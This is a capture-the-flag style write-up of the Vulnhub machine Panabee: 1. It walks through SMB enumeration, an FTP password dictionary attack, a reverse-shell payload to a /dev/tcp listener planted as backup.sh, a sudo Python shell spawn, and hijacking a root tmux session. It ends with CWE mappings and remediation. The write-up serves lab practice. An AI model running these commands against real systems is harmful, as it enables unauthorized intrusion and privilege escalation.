# Panabee: 1

Difficulty:: #Medium
> Classified according to [Vulhub difficulty page](https://www.vulnhub.com/difficulty/)

## Target data
- Link: [Panabee: 1](https://www.vulnhub.com/entry/panabee-1,502/)
- CVSS3 : [AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H/RL:W/RC:U/CR:H/IR:H/AR:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H/RL:W/RC:U/CR:H/IR:H/AR:H)
  > **Warning**: I select the CVSS3 score to start to practice, so is very possible that I made a mistake in the selection, so do not trust of that CVSS3.

## Machine Description
*This is an intermediate VM*

## Summary
Panabee: 1 starts with the `panabee.my` domain name after starting the target machine, this target has the `SMB` service available, and with the `smbclient` command I get the file `note.txt`, the file has interesting information, and the server automatically backs up, and it stores the files in the `goper` home directory. With `ffuf` I find the virtual host `dev.panabee.my`, where I read a chat history that says the `goper`'s `ftp`password was renewed, I guess maybe is a weak password, and with `ncrack` and the Rockyou list I crack the `goper:spiderman` credentials in the `ftp` service. I see the `goper`'s home directory in the `ftp` services, and in the `.bash_history` I can see that there was a `backup.sh` file, and by the previous information I guess there is a background process that runs that file, so I write a reverse shell in a file called `backup.sh`  and upload it into the `ftp` services and I get the `goper` shell. In the `sudo` privileges I find the user `goper` can run `/usr/bin/python3 /home/goper/status.py` as the `jenny` user. and it has permission to modify the `status.py` file, then I stored a payload to spawn a shell and run that script, and get the `jenny` shell. With the `jenny` user I find a root `tmux` process with `/opt/.tmux-0/sockets/default`  and it has `setuid` permissions and the `jenny` group belongs to that file, after reading the [Tmux section in Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#tmux-sessions-hijacking) and solve the  [tmux: open terminal failed: missing or unsuitable terminal: xterm-256color](https://stackoverflow.com/questions/21523815/tmux-open-terminal-failed-missing-or-unsuitable-terminal-xterm-256color), I could spawn the `root` shell and get the `root` flag.

1. CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
2. CWE-521: Weak Password Requirements
3. CWE-220: Storage of File With Sensitive Data Under FTP Root
4. CWE-434: Unrestricted Upload of File with Dangerous Type
5. CWE-250: Execution with Unnecessary Privileges
6. CWE-732: Incorrect Permission Assignment for Critical Resource
7. CWE-312: Cleartext Storage of Sensitive Information
8. CWE-269: Improper Privilege Management

#VMWare #Nmap #Python #Feroxbuster #Ffuf #vhosts #setuid #FTP #Postfix #Samba #SMB #Smbclient #ncrack #tmux

## Enumeration
When I run the target machine in VMware Workstation 17 Player (see the [setup vulnhub machines](../setup-vulnhub.md), and on my target machine, I run the `netdiscover` command:
```shell
$ sudo netdiscover -i enp0s3 -r 192.168.56.0/24
```
Then I compare the MAC with that of the target VMware configuration, and I find out that the IP is `192.168.56.121`.

![evidence](./static/00-vmware.png)

And I see the domain `panabee.my` in the machine description, and I add it to my `/etc/hosts` file:
```shell
$ echo "192.168.56.121 panabee panabee.my" | sudo tee -a /etc/hosts
```
And I start scanning the target with `nmap`:
```shell
$ nmap -p- -sV -oA scans/nmap-full-tcp-scan panabee.my
...SNIPPED...
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
...SNIPPED...
```
Then I identify 6 open ports, and the `vsftpd 3.0.3` service runs on `21` TCP, and the `OpenSSH 8.2p1` service runs on `22` TCP, and the `Postfix smtpd` service runs on `25` TCP, and the `Apache httpd 2.4.41` service runs on `80` TCP, and the `Samba smbd 4.6.2` service runs on `139` and `445` TCP, and it runs on Ubuntu.

When I scan it again with the general scripts scan:
```shell
$ nmap -p 21,22,25,80,139,445 -sCV -oA scans/nmap-tcp-script-scan \
> panabee.my
```
Then I can see:

![evidence](./static/01-nmap.png)

And it does not detect the user `Anonymous` in the `FTP` service.

## Normal use case
Given I access `http://panabee.my`, then I can see:

![evidence](./static/02-index.png)

And I can read information about the company, but it seems to be a static site.

## Dynamic detection
Sensitive data exposed, weak password, and arbitrary command execution.

Given I can access to `FTP` service, but it does not allow the `Anonymous` user, and I have no credentials
And in the `HTTP` service, the website seems to be static, and in the `Postfix` service, I could only enumerate users or send emails, then I start to check the `SMB` service. When I use the `smbclient` command:
```shell
$ smbclient -L \\\\192.168.56.121 -N
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
note            Disk      Daily works
IPC$            IPC       IPC Service (panabee server (Samba, Ubuntu))
```
Then I see the `note` directory. When I check the files inside it:
```shell
$ smbclient \\\\192.168.56.121\\note -N
```
Then I can see only one file:

![evidence](./static/03-smbclient.png)

When I read the `note.txt` file:
```
Dear goper,
I'll just leave it here as a note,
Sorry for the late response,
The server will now `backup` your files in your home dir,
go ahead and backup anything you like, the server will do it for you.
Please delete this note once you've read it for security measure
```
Then I can see interesting information, and the server automatically backs up, and it stores the files in the `goper` home directory, and now I need to find out where I can access that service, and there should be another endpoint or subdomain with more information.

When I use the `feroxbuster` command, and I use a list of SecLists:
```shell
$ feroxbuster -w raft-large-directories-lowercase.txt \
> -u 'http://panabee.my' \
> -x php,inc.php,txt,html,md,jpg,xml,xls,sh,sql,exe,pdf
```
Then I can see:

![evidence](./static/04-feroxbuster.png)

And almost all the endpoints it found are `.html`, and with that, I am more sure that it is a static site, and none of them seem to be helpful.

When I search for virtual hosts with the `ffuf` command, and I use a list of SecLists:
```shell
$ ffuf -H "Host: FUZZ.panabee.my" -w \
> bitquark-subdomains-top100000.txt:FUZZ -u http://192.168.56.121 \
> -fs 10918

...SNIPPED...
dev     [Status: 200, Size: 1578, Words: 163, Lines: 86]
...SNIPPED...
```
Then I find the virtual host `dev.panabee.my`, and I add it to my `/etc/hosts` file.

When I access `http://dev.panabee.my`, then I can see a chat history:

![evidence](./static/05-dev-index.png)

And I read that the `goper`'s password was renewed, and I think that the `FTP` service is the one that stores the backup copies, and maybe the password can be found with a dictionary attack.When I google `brute force ftp login`, then I find the post [brute forceftp credentials get server access](https://null-byte.wonderhowto.com/how-to/brute-force-ftp-credentials-get-server-access-0208763/), and it mentions the `ncrack` tool, When I use the `ncrack` command after reading the `--help` option, and I use the Rockyou list:
```shell
$ ncrack --user goper -P rockyou.txt ftp://192.168.56.121
192.168.56.121 21/tcp ftp: 'goper' 'spiderman'
192.168.56.121 21/tcp ftp: 'goper' 'hotmail'
```
And in less than 5 minutes, those results.I try to access with both passwords using `ftp` command, then it works with `goper:spiderman`, and I can see the `goper`'s home directory:

![evidence](./static/06-ftp.png)

## Exploitation

And it contains multiple interesting files, but I will try to create a `.ssh` directory, and I will upload a public SSH key, and if the server allows remote `SSH` connection, then I will be able to get the `goper`'s shell.
When I try it, and I use the `ssh-keygen` command:
```shell
$ ssh-keygen -t rsa -b 3072 -f ./id_rsa_goper -P "" -C "goper@panabee"
```
And I create the `.ssh` directory with the `curl` command:
```shell
$ curl 'ftp://goper:spiderman@panabee/.ssh/' --ftp-create-dirs
```
And I upload the public `SSH` key, and I give the proper permissions:
```shell
$ curl -T id_rsa_goper.pub \
> 'ftp://goper:spiderman@panabee/.ssh/authorized_keys' \
> -Q '-SITE CHMOD 644 backup.sh'
```
And I use the `ssh` command:
```shell
$ ssh -i id_rsa_goper goper@panabee
goper@panabee: Permission denied (publickey).
```
Then it does not work, and it seems the server does not allow remote connections, and I decided to change the approach, and I will start checking every file on the `FTP` service, and maybe I will figure out a way to get `Goper`'s shell. When I download the `status.py` file, then I identify lines from `13` to `16`:
```python
13 if ping(host):
14   os.system("/usr/bin/echo 'Server is up' > /home/jenny/status.txt")
15 else:
16   os.system("/usr/bin/echo 'Server is down' > /home/jenny/status.txt")
```
And the variable `host` is set with `127.0.0.1`, and I discover the user `jenny`, and the `gopher` user has permission to modify that file, and if a background process or `crontab` is running that script, then I could run arbitrary commands. When I try it, and I modify the file with the following payload:
```python
import os
os.system("/bin/bash -c 'curl 192.168.56.101:8000'")
```
And I open an `HTTP` service with Python3:
```shell
$ python3 -m http.service 8000
```
And I change the name of the current `status.py` file:
```shell
$ ftp> rename status.py status.py.bak
```
And I upload the new `status.py` file:
```shell
$ ftp> put status.py status.py
```
And I wait for a few minutes, then nothing happens, and my assumption that the script is being executed by a process was wrong, and I was stuck for a while. When I start going through the files I found so far again, then the `note.txt` makes me think that something should do the `backup`. When I search for `backup` in the `.bash_history`:
```shell
$ cat .bash_history | grep backup
bash /home/goper/backup.sh
/home/goper/backup.sh
/home/goper/backup.sh
chmod +x backup.sh
./backup.sh
rm backup.sh
```
Then maybe there is a process that executes the `backup.sh` script, and that is the same guess I made with the `script.py`, but I have no other options right now. Then I will give it a try. When I create a file called `backup.sh` with a reverse shell payload:
```shell
$ echo \
> "bash -c 'bash -i >& /dev/tcp/192.168.56.101/1234 0>&1'" > backup.sh
```
And I open a listener with the `nc` command:
```shell
$ nc -lvnp 1234
```
And I upload the `backup.sh` script with the `curl` command:
```shell
$ curl -T backup.sh 'ftp://goper:spiderman@panabee/backup.sh' \
> -Q '-SITE CHMOD 755 backup.sh'
```
Then it works, I get the reverse shell :

![evidence](./static/07-reverseshell.png)

And I can conclude that there is a background process, and that runs everything it finds in a file called `backup.sh`, and that allows me to run arbitrary `bash` commands.

## Lateral movement
Script execution with sudo privileges and Tmux session with root privileges.

Given I find public notes where I can identify the user `goper`, and I also find out that there is a backup process, and I find that `goper`'s `FTP` password was restored, and I was able to find the password with a dictionary attack, and the backup process allows the execution of arbitrary commands, and that allows me to get a reverse shell, then now, I am going to explore the server. When I use the `sudo` command:
```shell
$ goper@panabee:~$ sudo -l
User goper may run the following commands on panabee:
    (jenny) NOPASSWD: /usr/bin/python3 /home/goper/status.py
```
Then  I can do what I was doing above with the `status.py` file. When I store a payload to spawn a shell with the `status.py` file:
```shell
$ goper@panabee:~$ echo 'import pty; pty.spawn("/bin/bash")' > status.py
```
And I run it with `sudo` as the user `jenny`:
```shell
$ goper@panabee:~$ sudo -u jenny /usr/bin/python3 /home/goper/status.py
```
Then it works, I get `jenny`'s shell:

![evidence](./static/08-jenny-shell.png)

## Privilege escalation

When I explore `jenny`'s home directory, then I can see:
```shell
-rw------- 1 jenny jenny 1987 Jun 30  2020 .bash_history
...
-rw------- 1 jenny jenny   32 Jun 15  2020 .lesshst
-rw-r--r-- 1 jenny jenny  807 Feb 25  2020 .profile
-rw-rw-r-- 1 jenny jenny   13 Jun 15  2020 status.txt
-rw-r--r-- 1 root  root   213 Jun 15  2020 thanks_jenny
drwxrwxr-x 2 root  jenny 4096 Jun 30  2020 .tmux-0
```
And I read the `thanks_jenny` file:
```txt
Hello jenny,
Hope you're doing fine, I'll be outstation for two weeks.
I've set up your access to manage this server.
I know this is against the rule, `pl3eez3` keep this as our secret
From,
Sysadmin
```
And the word `pl3eez3` looks like a password, when I check the `.tmux-0` directory, then I find:
```shell
-rw-r--r-- 1 root  root   285 Jun 15  2020 secret.zip
```
When I use the `unzip` command:
```shell
$ jenny@panabee:~/.tmux-0$ unzip secret.zip
unzip secret.zip
Archive: secret.zip
[secret.zip] <3.txt password:
```
Then it asks me for a password, and I try the string `pl3eez3`, and it works, and the file `<3.txt` is inflated. When I read the file ``<3.txt`:
```txt
Hi Jenney,
This is my private message to you,
I know this is wrong as a sysadmin,
Are you free for a movie date?
```
Then it is just a romantic note, but the name `tmux-0` might be a clue, when I check if there is a process running with a `Tmux` session:
```shell
$ jenny@panabee:~$ ps auxww | grep tmux
root ... tmux -S /opt/.tmux-0/sockets/default new -s sharedsessions -d
```
Then there it is, it looks like a socket. When I check the file permissions:
```shell
$ jenny@panabee:~$ ls -la /opt/.tmux-0/sockets/default
srw-rw---- 1 root jenny 0 Mar 4 18:19 /opt/.tmux-0/sockets/default
```
Then it has `setuid` permissions. When I read the [Tmux section in Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#tmux-sessions-hijacking), and I read the Tmux documentation, and I play with the commands, then I start to understand how it works.

When I use the `tmux` command:
```shell
$ jenny@panabee:~$ tmux -S /opt/.tmux-0/sockets/default a -t sharedsessions
open terminal failed: missing or unsuitable terminal: unknown
```
Then I get an error, maybe the problem is that I used a reverse shell, and maybe I do not have some environmental variables. When I google that error, then I find a solution on StackOverflow: [tmux: open terminal failed: missing or unsuitable terminal: xterm-256color](https://stackoverflow.com/questions/21523815/tmux-open-terminal-failed-missing-or-unsuitable-terminal-xterm-256color):

![evidence](./static/09-tmux-xterm.png)

When I export the variable:
```shell
$ jenny@panabee:~$ export TERM=xterm
```
And I use the same `tmux` command that I used above, then it works, it opens the `Tmux` session of the `root` user, and I get the root flag:

![evidence](./static/10-censored-rootflag.png)

## Remediation
Given I find sensitive information in public access, and I was able to find the password with a dictionary attack, and I was able to upload a file to run `bash` commands, and I find a script that I was able to run with `sudo` privileges, and I find a `Tmux` session with `root` privileges, then they must remove all sensitive information for unauthorized users, and do not use leaked passwords, and do not run arbitrary files with the backup process, and check the `sudo` privileges, and do not leave `Tmux` sessions open with `root` privileges, then with that, it may not be possible to get the `root`'s shell.